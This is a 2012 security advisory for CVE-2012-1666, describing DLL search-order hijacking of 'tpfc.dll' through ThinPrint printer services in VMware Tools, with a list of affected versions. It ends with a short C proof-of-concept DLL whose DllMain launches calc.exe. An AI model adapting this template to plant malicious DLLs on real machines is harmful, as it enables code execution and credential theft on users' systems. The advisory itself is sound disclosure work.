Subject: VMWare Tools susceptible to binary planting by hijack

Security Advisory - VMWare Tools susceptible to binary planting by hijack
=========================================================================
Summary           : VMWare Tools susceptible to binary planting
Date              : 4 September 2012
Affected versions : Product versions prior to -
					Workstation 8.0.4
					Player 4.0.4
					Fusion 4.1.2
					View 5.1
					ESX 5.0 P03
					ESX 4.1 U3
					Not affected: ESX 4.0, ESX 3.5
CVE reference     : CVE-2012-1666

Details
================
VMWare Tools handles many functions involved with host-guest interactivity,
providing a richer environment for the end-user and server administrators alike.
Part of VMWare Tools responsibilities is handling printer services through host
and is called by a third-party acquired tool (ThinPrint).

During initiation, which occurs during many steps throughout printer comm.
negotiation, a non-existent dynamic-link library is called, resulting in an
unqualified dynamic-link library call to 'tpfc.dll'.

A user with local disk access can carefuly construct a DLL that suits the
pattern that is being traversed by the client and implement it somewhere along
the search path and the client will load it seamlessly.

Impact
================
After the DLL has been implemented, an unsuspected user that will run printer
services, for example, will cause it to load, resulting in arbitrary code
execution under user's privilege level.

This vector of attack is mainly used in a local privilege escalation scenarios,
user credential harvesting and can be used by malware to disguise itself,
amongst other uses.

Proof of Concept
================

	#include <windows.h> 

	int hijack_poc () 
	{ 
	  WinExec ( "calc.exe" , SW_NORMAL );
	  return 0 ; 
	} 
	  
	BOOL WINAPI DllMain 
		 (	HINSTANCE hinstDLL , 
			DWORD dwReason ,
			LPVOID lpvReserved ) 
	{ 
	  hijack_poc () ;
	  return 0 ;
	}
